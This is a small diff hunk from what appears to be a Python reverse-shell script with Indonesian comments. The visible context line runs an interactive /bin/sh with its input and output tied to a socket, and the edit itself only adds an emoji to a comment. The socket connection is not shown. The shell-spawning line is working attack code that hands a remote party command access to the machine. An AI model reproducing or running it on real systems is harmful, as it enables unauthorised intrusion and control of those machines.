@@ -9,4 +9,4 @@ else:
     subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
 
     ## 'nt' untuk Windows.
-    ## 'posix' untuk Linux/Unix.
+    ## 'posix' untuk Linux/Unix. 🎃
